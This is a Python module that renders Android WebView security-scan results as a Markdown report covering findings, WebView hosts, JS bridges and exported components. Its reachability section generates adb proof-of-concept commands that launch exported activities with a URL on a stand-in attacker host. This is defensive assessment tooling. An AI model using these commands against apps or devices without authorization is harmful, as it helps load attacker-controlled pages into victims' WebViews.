"""Render a Report to Markdown."""

from __future__ import annotations

import re

from .scanner import Report


def _extra_key(flow: str) -> str:
    """Recover the intent extra name from an intent_url_source description so the
    suggested adb command matches the real key (e.g. EXTRA_URL, url)."""
    m = re.search(r"getString\(([^)]+)\)", flow)
    return m.group(1).strip('"') if m else ""


def render(report: Report) -> str:
    out = []
    p = out.append
    p(f"# WebView / in-app browser recon: `{report.target}`\n")
    p(f"- Package: `{report.package}` {report.version_name} (code {report.version_code})")
    p(f"- SDK: min {report.min_sdk} / target {report.target_sdk}")
    f = report.facts
    p(f"- Network security config: `{f.get('nsc_file')}` "
      f"(cleartext permitted = {f.get('nsc_cleartext_permitted')})")
    p(f"- Native libs touching WebView: {len(report.native_webview_libs)}")
    p("")

    counts = {}
    for fi in report.findings:
        counts[fi["severity"]] = counts.get(fi["severity"], 0) + 1
    p("## Summary\n")
    for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
        if counts.get(sev):
            p(f"- {sev}: {counts[sev]}")
    p("")

    p("## Findings\n")
    for fi in report.findings:
        p(f"### [{fi['severity']}] {fi['rule']} - {fi['title']}")
        if fi.get("location"):
            p(f"_{fi['location']}_")
        p("")
        p(fi["detail"])
        if fi.get("evidence"):
            p("")
            p("```")
            p(str(fi["evidence"])[:600])
            p("```")
        p("")

    # Reachability first: a latent WebView misconfiguration is only actionable if
    # something off-device can actually reach it. This section answers "how would
    # someone exploit this with the app installed on their phone?".
    chains = [h for h in report.hosts if h.is_exported_component and h.intent_url_source]
    p("## Reachability\n")
    if not chains:
        p("No exported entry point was found that loads an attacker-supplied URL into "
          "a WebView. The misconfigurations above are latent: reaching them requires "
          "either an in-app navigation to attacker-controlled content (e.g. a malicious "
          "ad or a link the user opens in-app) or a separate bug that supplies the URL.")
        p("")
    else:
        p("These exported entry points render a URL chosen by whoever launches them, "
          "so any app on the device (or an ad SDK, or a browsed link) can drive them "
          "with no user action inside the app. Verify on a test device with `adb`, "
          "substituting the component and extra key:\n")
        p("```sh")
        for h in chains:
            key = _extra_key(h.intent_url_source) or "url"
            p(f"# {h.name}")
            p(f"adb shell am start -n {report.package}/{h.name} "
              f'-e {key} "https://attacker.example/poc.html"')
            p("")
        p("```")
        p("")
        p("| component | intent-URL flow | JS bridge | local file access |")
        p("|-----------|-----------------|-----------|-------------------|")
        for h in chains:
            bridges = ", ".join(f"`{b.name}`" for b in h.bridges) or "—"
            fa = "yes" if h.settings.get("allow_file_access") is True else "—"
            p(f"| `{h.name}` | {h.intent_url_source} | {bridges} | {fa} |")
        p("")

    p("## WebView hosts\n")
    for h in report.hosts:
        if not h.settings and not h.bridges and not h.loaded_urls:
            continue
        p(f"### `{h.name}`")
        p(f"- sources: {h.source}"
          + (" (exported component)" if h.is_exported_component else ""))
        if h.settings:
            p("- settings:")
            for k, v in sorted(h.settings.items()):
                p(f"  - `{k}` = `{v}`")
        if h.bridges:
            p("- JS bridges: " + ", ".join(f"`{b.name}`" for b in h.bridges))
        if h.loaded_urls:
            p("- loaded URLs:")
            for u in h.loaded_urls[:10]:
                p(f"  - `{u}`")
        if h.unrestricted_navigation:
            p("- navigation: **no allowlist detected**")
        if h.intent_url_source:
            p(f"- intent-supplied URL: `{h.intent_url_source}`")
        p("")

    p("## Exported components\n")
    p("| kind | name | exported | deeplinks |")
    p("|------|------|----------|-----------|")
    for c in report.components:
        links = "<br>".join(c.deeplinks[:4])
        p(f"| {c.kind} | `{c.name}` | {c.exported} | {links} |")
    p("")

    if report.native_webview_libs:
        p("## Native libraries referencing WebView\n")
        for lib in report.native_webview_libs:
            p(f"- `{lib}`")
        p("")

    if report.errors:
        p("## Errors\n")
        for e in report.errors:
            p(f"- {e}")
    return "\n".join(out)
